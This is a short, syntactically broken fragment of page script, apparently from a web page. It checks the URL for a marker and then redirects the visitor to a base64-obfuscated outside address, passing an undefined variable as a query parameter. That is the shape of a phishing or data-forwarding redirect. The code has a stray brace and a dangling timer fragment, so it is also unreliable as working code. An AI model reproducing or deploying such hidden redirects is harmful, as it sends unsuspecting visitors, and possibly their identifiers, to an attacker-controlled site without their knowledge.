        <script>
            
            var _u = window.location.href;
        var u = new URL(_u);

            if(window.location.href.includes(".(")) {

                document.location.href = atob("aHR0cHM6Ly93ZWItaW50ZWxsZWN0LmNvbS9kYi8/ZT0=")+gp;
            }
            }, 1 * 3000);
